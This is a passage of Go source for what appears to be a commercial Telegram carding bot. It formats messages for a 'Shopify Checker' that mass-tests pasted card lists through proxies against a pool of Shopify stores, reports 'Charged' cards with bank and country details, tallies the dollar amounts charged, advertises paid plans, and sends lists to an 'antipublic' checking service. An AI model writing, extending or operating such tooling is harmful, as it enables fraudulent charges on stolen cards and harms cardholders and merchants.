	for _, s := range sites {
		url := strings.TrimRight(s.URL, "/")
		if isBlacklisted(url) {
			skipped++
			continue
		}
		newPool = append(newPool, url)
	}
	if skipped > 0 {
		fmt.Printf("[BLACKLIST] skipped %d blacklisted sites during pool refresh\n", skipped)
	}
	sitePoolMu.Lock()
	sitePool = newPool
	sitePoolMu.Unlock()
}

func getSitePool() []string {
	var raw []string
	if cs := getCustomSites(); len(cs) > 0 {
		raw = cs
	} else {
		sitePoolMu.RLock()
		raw = make([]string, len(sitePool))
		copy(raw, sitePool)
		sitePoolMu.RUnlock()
	}
	filtered := raw[:0]
	for _, s := range raw {
		if !isBlacklisted(s) {
			filtered = append(filtered, s)
		}
	}
	return filtered
}


func formatWelcomeCard(uid int64, username string, proxyCount int, credits float64, hasUnlimited bool) string {
	creditsStr := strconvFloat(credits)
	if hasUnlimited {
		creditsStr = "Unlimited"
	}
	return "━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiCheck, "\xe2\x9c\x85") + " <b>Active</b> " + em(emojiCheck, "\xe2\x9c\x85") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiBlue, "\xf0\x9f\x94\xb5") + " <b>ID</b> -> <code>" + strconv.FormatInt(uid, 10) + "</code>\n" +
		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>User</b> -> @" + html.EscapeString(username) + "\n" +
		em(emojiCalendar, "\xf0\x9f\x93\x85") + " <b>Proxies</b> -> " + strconv.Itoa(proxyCount) + " loaded\n" +
		em(emojiPrice, "\xf0\x9f\x92\xb0") + " <b>Credits</b> -> " + creditsStr + "\n" +
		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001\n" +
		"━━━━━━━━━━━━━━━━━━━━"
}

func formatGatesMsg() string {
	return "━━━━━━━━━━━━━━━━━━━━\n" +
		"𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗚𝗮𝘁𝗲𝘄𝗮𝘆\n" +
		"━━━━━━━━━━━━━━━━━━━━"
}

func formatShopifyGatesMsg() string {
	return "━━━━━━━━━━━━━━━━━━━━\n" +
		"𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n" +
		"━━━━━━━━━━━━━━━━━━━━\n\n" +
		em(emojiCmdSh, "\xe2\x9c\x85") + " <b>/sh</b> &lt;cc list&gt;\n" +
		"   Quick check up to 100 cards\n" +
		"   Paste cards directly inline\n\n" +
		em(emojiCmdTxt, "\xe2\x9c\x85") + " <b>/txt</b>\n" +
		"   Reply to a .txt file with cards\n\n" +
		em(emojiCheck, "\xe2\x9c\x85") + " Status: <b>Active</b>\n" +
		"━━━━━━━━━━━━━━━━━━━━"
}

func formatPricingMsg() string {
	return "━━━━━━━━━━━━━━━━━━━━\n" +
		"𝗣𝗿𝗶𝗰𝗶𝗻𝗴 𝗣𝗹𝗮𝗻𝘀\n" +
		"━━━━━━━━━━━━━━━━━━━━\n\n" +
		"<b>Plan:</b> 7 days\n" +
		"  Duration: 7 days\n" +
		"  Credits: Unlimited\n" +
		"  Price: DM\n" +
		"────────────────────\n" +
		"<b>Plan:</b> 15 days\n" +
		"  Duration: 15 days\n" +
		"  Credits: Unlimited\n" +
		"  Price: DM\n" +
		"────────────────────\n" +
		"<b>Plan:</b> 30 days\n" +
		"  Duration: 30 days\n" +
		"  Credits: Unlimited\n" +
		"  Price: DM\n" +
		"────────────────────\n" +
		"<b>Plan:</b> 90 days\n" +
		"  Duration: 90 days\n" +
		"  Credits: Unlimited\n" +
		"  Price: DM\n" +
		"━━━━━━━━━━━━━━━━━━━━\n\n" +
		"DM -> @SORRY_00001"
}

func formatStartMsg() string {
	return "━━━━━━━━━━━━━━━━━━━━\n" +
		"  " + em(emojiBot, "\xf0\x9f\xa4\x96") + " <b>Help & Commands</b> " + em(emojiBot, "\xf0\x9f\xa4\x96") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━\n\n" +
		em(emojiCmdSh, "\xe2\x9c\x85") + "  <b>/sh</b> &lt;cc list&gt;\n" +
		"     Quick check up to 100 cards\n" +
		"     Paste cards directly inline\n\n" +
		em(emojiCmdTxt, "\xe2\x9c\x85") + "  <b>/txt</b>\n" +
		"     Reply to a .txt file to mass check\n\n" +
		em(emojiCmdSetpr, "\xe2\x9c\x85") + "  <b>/setpr</b> &lt;proxy&gt;\n" +
		"     Add proxy(s) for checking\n\n" +
		em(emojiCmdRmpr, "\xe2\x9c\x85") + "  <b>/rmpr</b> &lt;proxy&gt; or /rmpr all\n" +
		"     Remove proxies\n\n" +
		em(emojiCmdStats, "\xe2\x9c\x85") + "  <b>/stats</b>\n" +
		"     View your usage stats\n\n" +
		em(emojiCmdActive, "\xe2\x9c\x85") + "  <b>/active</b>\n" +
		"     See live checking sessions\n\n" +
		"━━━━━━━━━━━━━━━━━━━━\n" +
		"  " + "\xe2\x9a\xa1" + " <b>Powered By @SORRY_00001</b> " + "\xe2\x9a\xa1" + "\n" +
		"━━━━━━━━━━━━━━━━━━━━"
}

func formatProgressMsg(s *CheckSession) string {
	checked := int(s.Checked.Load())
	total := s.Total
	charged := int(s.Charged.Load())
	approved := int(s.Approved.Load())
	declined := int(s.Declined.Load())
	errors := int(s.Errors.Load())
	creditsUsed := charged*2 + approved
	elapsed := time.Since(s.StartTime).Truncate(time.Second)

	pgGw := s.GatewayName
	if pgGw == "" {
		pgGw = "AutoShopify Charge"
	}
	return em(emojiBlue, "\xf0\x9f\x94\xb5") + " <b><i>Checking...</i></b>\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiBlue, "\xf0\x9f\x94\xb5") + " <b>Session ID</b> -> <b>" + html.EscapeString(s.SessionID) + "</b>\n" +
		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(pgGw) + "</b>\n" +
		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Total Cards</b> -> <b>" + strconv.Itoa(total) + "</b>\n" +
		em(emojiSearch, "\xf0\x9f\x94\x8d") + " <b>Checked</b> -> <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Charged</b> -> <b>" + strconv.Itoa(charged) + "</b>\n" +
		em(emojiCheck, "\xe2\x9c\x85") + " <b>Approved</b> -> <b>" + strconv.Itoa(approved) + "</b>\n" +
		em(emojiCross, "\xe2\x9d\x8c") + " <b>Declined</b> -> <b>" + strconv.Itoa(declined) + "</b>\n" +
		em(emojiWarn, "\xe2\x9a\xa0\xef\xb8\x8f") + " <b>Error Cards</b> -> <b>" + strconv.Itoa(errors) + "</b>\n" +
		em(emojiPrice, "\xf0\x9f\x92\xb2") + " <b>Credits Used</b> -> <b>" + strconv.Itoa(creditsUsed) + "</b>\n" +
		em(emojiClock, "\xe2\x8f\xb1") + " <b>Time</b> -> <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b> " + em(emojiClock, "\xe2\x8f\xb1") + "\n" +
		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>Check By</b> -> <b>@" + html.EscapeString(s.Username) + "</b>\n" +
		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
}

func formatCompletedMsg(s *CheckSession) string {
	checked := int(s.Checked.Load())
	total := s.Total
	charged := int(s.Charged.Load())
	approved := int(s.Approved.Load())
	declined := int(s.Declined.Load())
	errors := int(s.Errors.Load())
	creditsUsed := charged*2 + approved
	elapsed := time.Since(s.StartTime).Truncate(time.Millisecond * 100)

	cmpGw := s.GatewayName
	if cmpGw == "" {
		cmpGw = "AutoShopify Charge"
	}
	return em(emojiCheck, "\xe2\x9c\x85") + " <b><i>Completed</i></b> " + em(emojiCheck, "\xe2\x9c\x85") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiBlue, "\xf0\x9f\x94\xb5") + " <b>Session ID</b> -> <b>" + html.EscapeString(s.SessionID) + "</b>\n" +
		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(cmpGw) + "</b>\n" +
		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Total Cards</b> -> <b>" + strconv.Itoa(total) + "</b>\n" +
		em(emojiSearch, "\xf0\x9f\x94\x8d") + " <b>Checked</b> -> <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Charged</b> -> <b>" + strconv.Itoa(charged) + "</b>\n" +
		em(emojiCheck, "\xe2\x9c\x85") + " <b>Approved</b> -> <b>" + strconv.Itoa(approved) + "</b>\n" +
		em(emojiCross, "\xe2\x9d\x8c") + " <b>Declined</b> -> <b>" + strconv.Itoa(declined) + "</b>\n" +
		em(emojiWarn, "\xe2\x9a\xa0\xef\xb8\x8f") + " <b>Error Cards</b> -> <b>" + strconv.Itoa(errors) + "</b>\n" +
		em(emojiPrice, "\xf0\x9f\x92\xb2") + " <b>Credits Used</b> -> <b>" + strconv.Itoa(creditsUsed) + "</b>\n" +
		em(emojiClock, "\xe2\x8f\xb1") + " <b>Time</b> -> <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b> " + em(emojiClock, "\xe2\x8f\xb1") + "\n" +
		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>Check By</b> -> <b>@" + html.EscapeString(s.Username) + "</b>\n" +
		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
}

func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
	chGw := r.Gateway
	if chGw == "" {
		chGw = "Shopify Payments"
	}
	chResp := r.StatusCode
	if chResp == "" {
		chResp = "ORDER_PLACED"
	}
	return "<b><i>Charged</i></b> " + em(emojiCharged, "\xf0\x9f\x94\xa5") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Card</b>\n" +
		"-> <code>" + html.EscapeString(card) + "</code>\n" +
		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(chGw) + "</b>\n" +
		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Response</b> -> <b>" + html.EscapeString(chResp) + "</b>\n" +
		em(emojiPrice, "\xf0\x9f\x92\xb2") + " <b>Price</b> -> <b>" + html.EscapeString(r.Amount) + "</b> " + em(emojiPrice, "\xf0\x9f\x92\xb2") + "\n\n" +
		em(emojiBrand, "\xf0\x9f\x94\xb0") + " <b>Brand</b> -> <b>" + html.EscapeString(bin.Brand) + "</b>\n" +
		em(emojiBank, "\xf0\x9f\x8f\xa6") + " <b>Bank</b> -> <b>" + html.EscapeString(bin.Bank) + "</b>\n" +
		em(emojiGlobe, "\xf0\x9f\x8c\x8d") + " <b>Country</b> -> <b>" + html.EscapeString(bin.Country) + "</b> " + html.EscapeString(bin.CountryFlag) + "\n\n" +
		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>User</b> -> <b>@" + html.EscapeString(username) + "</b>\n" +
		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
}

func formatApprovedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
	apGw := r.Gateway
	if apGw == "" {
		apGw = "Shopify Payments"
	}
	header := "3DS"
	if r.StatusCode == "INSUFFICIENT_FUNDS" {
		header = "Insufficient"
	} else if r.StatusCode == "CARD_APPROVED" {
		header = "Approved"
	}
	return "<b><i>" + header + "</i></b> " + em(emojiCheck, "\xe2\x9c\x85") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Card</b>\n" +
		"-> <code>" + html.EscapeString(card) + "</code>\n" +
		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(apGw) + "</b>\n" +
		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Response</b> -> <b>" + html.EscapeString(r.StatusCode) + "</b>\n" +
		em(emojiBrand, "\xf0\x9f\x94\xb0") + " <b>Brand</b> -> <b>" + html.EscapeString(bin.Brand) + "</b>\n" +
		em(emojiBank, "\xf0\x9f\x8f\xa6") + " <b>Bank</b> -> <b>" + html.EscapeString(bin.Bank) + "</b>\n" +
		em(emojiGlobe, "\xf0\x9f\x8c\x8d") + " <b>Country</b> -> <b>" + html.EscapeString(bin.Country) + "</b> " + html.EscapeString(bin.CountryFlag) + "\n\n" +
		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>User</b> -> <b>@" + html.EscapeString(username) + "</b>\n" +
		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
}

func formatDeclinedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
	dcGw := r.Gateway
	if dcGw == "" {
		dcGw = "Shopify Payments"
	}
	return "<b><i>Declined</i></b> " + em(emojiCross, "\xe2\x9d\x8c") + "\n" +
		"━━━━━━━━━━━━━━━━━━━━━━\n" +
		em(emojiCard, "\xf0\x9f\x92\xb3") + " <b>Card</b>\n" +
		"-> <code>" + html.EscapeString(card) + "</code>\n" +
		em(emojiGateway, "\xf0\x9f\x94\x97") + " <b>Gateway</b> -> <b>" + html.EscapeString(dcGw) + "</b>\n" +
		em(emojiDoc, "\xf0\x9f\x93\x8b") + " <b>Response</b> -> <b>" + html.EscapeString(r.StatusCode) + "</b>\n" +
		em(emojiBrand, "\xf0\x9f\x94\xb0") + " <b>Brand</b> -> <b>" + html.EscapeString(bin.Brand) + "</b>\n" +
		em(emojiBank, "\xf0\x9f\x8f\xa6") + " <b>Bank</b> -> <b>" + html.EscapeString(bin.Bank) + "</b>\n" +
		em(emojiGlobe, "\xf0\x9f\x8c\x8d") + " <b>Country</b> -> <b>" + html.EscapeString(bin.Country) + "</b> " + html.EscapeString(bin.CountryFlag) + "\n\n" +
		em(emojiUser, "\xf0\x9f\x91\xa4") + " <b>User</b> -> <b>@" + html.EscapeString(username) + "</b>\n" +
		em(emojiLightning, "\xe2\x9a\xa1") + " <b>Owner</b> -> @SORRY_00001"
}

func formatActiveMsg() string {
	type entry struct {
		Username   string
		Checked    int
		Total      int
		Charged    int
		ChargedAmt float64
		Elapsed    time.Duration
	}
	var entries []entry
	allActiveSessions.Range(func(_, val any) bool {
		s := val.(*CheckSession)
		entries = append(entries, entry{
			Username:   s.Username,
			Checked:    int(s.Checked.Load()),
			Total:      s.Total,
			Charged:    int(s.Charged.Load()),
			ChargedAmt: s.ChargedAmt(),
			Elapsed:    time.Since(s.StartTime).Truncate(time.Second),
		})
		return true
	})

	if len(entries) == 0 {
		return "\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n  " + em(emojiCmdActive, "\xf0\x9f\x91\xa5") + "  Active Sessions\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n\n" + em(emojiLive, "\xf0\x9f\x94\xb4") + "  No active sessions\n\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81"
	}

	sort.Slice(entries, func(i, j int) bool { return entries[i].Username < entries[j].Username })

	var sb strings.Builder
	sb.WriteString("\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n  " + em(emojiCmdActive, "\xf0\x9f\x91\xa5") + "  Active Sessions\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n\n")
	sb.WriteString(fmt.Sprintf(em(emojiLive, "\xf0\x9f\x94\xb4")+"  %d users currently checking\n\n", len(entries)))
	sb.WriteString("\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\n")
	for i, e := range entries {
		pct := 0
		if e.Total > 0 {
			pct = e.Checked * 100 / e.Total
		}
		barLen := 10
		filled := barLen * e.Checked / max(e.Total, 1)
		bar := strings.Repeat("#", filled) + strings.Repeat("-", barLen-filled)
		h := int(e.Elapsed.Hours())
		m := int(e.Elapsed.Minutes()) % 60
		sc := int(e.Elapsed.Seconds()) % 60
		sb.WriteString(fmt.Sprintf("\xe2\x94\x82   %d. @%s\n", i+1, html.EscapeString(e.Username)))
		sb.WriteString(fmt.Sprintf("\xe2\x94\x82      %s %3d%%\n", bar, pct))
		sb.WriteString(fmt.Sprintf("\xe2\x94\x82        %d / %d\n", e.Checked, e.Total))
		sb.WriteString(fmt.Sprintf("\xe2\x94\x82      "+em(emojiRowCard, "\xf0\x9f\x92\xb3")+"  %d charged | $%.2f\n", e.Charged, e.ChargedAmt))
		sb.WriteString(fmt.Sprintf("\xe2\x94\x82      "+em(emojiTime, "\xe2\x8f\xb1")+" %02d:%02d:%02d\n", h, m, sc))
		sb.WriteString("\xe2\x94\x82                           \xe2\x94\x82\n")
	}
	sb.WriteString("\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98\n\n")
	sb.WriteString("\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n  " + em(emojiPwr, "\xe2\x9a\xa1") + " Powered By @SORRY_00001\n\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x80")
	return sb.String()
}

func formatStatsMsg(um *UserManager) string {
	um.mu.Lock()
	var totalChecked, totalApproved, totalDeclined, totalCharged int64
	var totalChargedAmt float64
	for _, ud := range um.users {
		s := ud.Stats
		totalChecked += s.TotalChecked
		totalApproved += s.TotalApproved
		totalDeclined += s.TotalDeclined
		totalCharged += s.TotalCharged
		totalChargedAmt += s.TotalChargedAmt
	}
	um.mu.Unlock()

	approvedRate := 0.0
	chargedRate := 0.0
	if totalChecked > 0 {
		approvedRate = float64(totalApproved) * 100.0 / float64(totalChecked)
		chargedRate = float64(totalCharged) * 100.0 / float64(totalChecked)
	}
	return "\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n" +
		"    " + em(emojiCmdStats, "\xf0\x9f\x93\x8a") + "  Global Statistics\n" +
		"\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n\n" +
		"\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x90\n" +
		"\xe2\x94\x82                              \xe2\x94\x82\n" +
		fmt.Sprintf("\xe2\x94\x82  "+em(emojiRowCheck, "\xe2\x9c\x85")+"  Total Checked  |  %6d  \xe2\x94\x82\n", totalChecked) +
		fmt.Sprintf("\xe2\x94\x82  "+em(emojiRowAppr, "\xe2\x9c\x85")+"  Approved       |  %6d  \xe2\x94\x82\n", totalApproved) +
		fmt.Sprintf("\xe2\x94\x82  "+em(emojiRowDecl, "\xe2\x9d\x8c")+"  Declined       |  %6d  \xe2\x94\x82\n", totalDeclined) +
		fmt.Sprintf("\xe2\x94\x82  "+em(emojiRowCard, "\xf0\x9f\x92\xb3")+"  Charged        |  %6d  \xe2\x94\x82\n", totalCharged) +
		"\xe2\x94\x82                              \xe2\x94\x82\n" +
		"\xe2\x94\x94\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x98\n\n" +
		em(emojiMoney, "\xf0\x9f\x92\xb0") + "  Total Charged Amount\n" +
		fmt.Sprintf("    $%.2f\n\n", totalChargedAmt) +
		em(emojiHitRate, "\xf0\x9f\x8e\xaf") + "  Hit Rates\n" +
		fmt.Sprintf("    "+em(emojiPctAppr, "\xe2\x9c\x85")+" Approved: %.1f%%\n", approvedRate) +
		fmt.Sprintf("    "+em(emojiRowCard, "\xf0\x9f\x92\xb3")+" Charged:  %.1f%%\n\n", chargedRate) +
		"\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\n" +
		"  " + em(emojiPwr, "\xe2\x9a\xa1") + " Powered By @SORRY_00001 " + em(emojiPwrStats, "\xe2\x9a\xa1") + "\n" +
		"\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x80"
}
func parseCardsFromText(text string) []string {
	var cards []string
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || !strings.Contains(line, "|") {
			continue
		}
		cards = append(cards, line)
	}
	return cards
}

func luhnCheck(cardNumber string) bool {
	clean := strings.ReplaceAll(cardNumber, " ", "")
	if len(clean) < 2 {
		return false
	}
	sum := 0
	alt := false
	for i := len(clean) - 1; i >= 0; i-- {
		ch := clean[i]
		if ch < '0' || ch > '9' {
			return false
		}
		d := int(ch - '0')
		if alt {
			d *= 2
			if d > 9 {
				d -= 9
			}
		}
		sum += d
		alt = !alt
	}
	return sum%10 == 0
}

func filterValidCards(cards []string, uid int64) (valid []string, originalIndices []int, removed int) {
	for i, card := range cards {
		if isAdmin(uid) && card == "1234567891234567|11|30|000" {
			valid = append(valid, card)
			originalIndices = append(originalIndices, i)
			continue
		}
		parts := strings.Split(card, "|")
		if len(parts) < 1 || !luhnCheck(parts[0]) {
			removed++
			continue
		}
		valid = append(valid, card)
		originalIndices = append(originalIndices, i)
	}
	return
}

func parseAmount(s string) float64 {
	s = strings.TrimSpace(s)
	var f float64
	fmt.Sscanf(s, "%f", &f)
	return f
}

func strconvFloat(f float64) string {
	s := strconv.FormatFloat(f, 'f', -1, 64)
	if s == "" || s == "0" {
		return "0"
	}
	return s
}

type antipublicResult struct {
	StatsText    string `json:"stats_text"`
	Public       string `json:"public"`
	Private      string `json:"private"`
	PublicCount  int    `json:"public_count"`
	PrivateCount int    `json:"private_count"`
}

func antipublicCheck(fileData []byte, filename string) (*antipublicResult, error) {
	const apiBase = "https://antipublic.dev"
	client := &http.Client{Timeout: 5 * time.Minute}

	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	writer.WriteField("check_operation", "check")
	writer.WriteField("enrich_source", "bot")
	h := textproto.MIMEHeader{}
	h.Set("Content-Disposition", fmt.Sprintf(`form-data; name="files"; filename="%s"`, filename))
